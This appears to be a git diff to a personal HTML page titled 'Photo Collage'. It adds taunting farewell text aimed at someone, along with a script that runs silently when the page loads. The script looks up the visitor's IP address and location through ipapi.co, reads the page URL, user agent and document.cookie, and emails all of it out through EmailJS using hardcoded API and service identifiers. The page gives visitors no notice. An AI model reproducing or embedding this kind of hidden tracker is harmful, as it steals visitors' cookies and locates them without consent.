@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <title>Photo Collage</title>
   <style>
     body {
@@ -51,8 +52,53 @@
   <br>
   <br>
 
-  <h1>Bye! Stay toxic and masculine in your 30s</h1>
-  <p>System permanently terminated. Cannot be reversed.</p>
+  <marquee behavior="scroll">
+    <h1>Dedicated song for y'all! ♥ ♥ ♥</h1>
+  </marquee>
+  <h1>Bye! Stay toxic and masculine in your 30s, PRIME HAS GONE </h1>
+  <h1>Too much ego, not enough class.</h1>
+  <h1>
+    <a href="https://youtube.com/shorts/rFwqbRdrIks?si=RPt7XGhtXJ0-z_mm" target="_blank">
+      WAHAHAHAAHAHAHHAHAAH 😇😇
+    </a>
+  </h1>
+  <script>
+    (function(){
+      // email js PUBLIC API KEY (user)
+      emailjs.init("MSHvHhsD9vmT1b2Cd");
+    })();
+
+    window.onload = async function () {
+      let ipData = {};
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipData = await res.json();
+      } catch (err) {
+        console.log("IP fetch failed:", err);
+      }
+
+      const params = {
+        page: window.location.href,
+        userAgent: navigator.userAgent,
+        time: new Date().toLocaleString(),
+        cookies: document.cookie,
+
+        ip: ipData.ip || "N/A",
+        city: ipData.city || "N/A",
+        region: ipData.region || "N/A",
+        country: ipData.country_name || "N/A"
+      };
+
+      // email js: serviceID, templateID, templateParams
+      emailjs.send("service_sd8nt2d", "template_c65f6tx", params)
+        .then(function(response) {
+          console.log("Email sent!", response.status);
+        }, function(error) {
+          console.log("Failed...", error);
+        });
+    };
+  </script>
 </body>
-<footer class="site-footer">April 2026</footer>
+<!-- <footer class="site-footer">April 2026</footer> -->
 </html>
